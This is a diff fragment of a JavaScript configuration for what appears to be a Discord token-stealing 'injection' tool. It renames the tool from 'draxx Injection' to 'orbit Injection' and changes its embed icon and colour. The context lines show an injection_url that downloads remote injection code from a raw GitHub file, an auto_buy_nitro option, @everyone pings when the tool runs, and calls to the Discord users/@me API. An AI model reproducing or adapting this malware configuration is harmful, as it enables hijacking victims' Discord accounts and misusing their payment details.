@@ -11,9 +11,9 @@ const config = {
   auto_buy_nitro: false, 
   ping_on_run: true, 
   ping_val: '@everyone', 
-  embed_name: 'draxx Injection', 
-  embed_icon: 'https://media.discordapp.net/attachments/1373332015574679673/1373334198403993660/butterfl.jpg?ex=682a08a4&is=6828b724&hm=f7044dcd1499537c7ab5943bbcf2e1b4ab71ad84f6a88169f5a9b16227434b5f&=&format=webp'.replace(/ /g, '%20'),
-  embed_color: 000, 
+  embed_name: 'orbit Injection', 
+  embed_icon: 'https://media.discordapp.net/attachments/1389050228262567980/1431792440209313903/b2e201329e9e68143fb58c1b11676e0c.webp?ex=6903515f&is=6901ffdf&hm=9a53703bf2eb33f16b53d00708fb2cbb9d6c9e9387f20c8ef8c3ad0c576d1dac&=&format=webp&width=218&height=218'.replace(/ /g, '%20'),
+  embed_color: 5639644, 
   injection_url: 'https://raw.githubusercontent.com/savv70/injection/refs/heads/main/injection_v2', 
 
   api: 'https://discord.com/api/v9/users/@me',
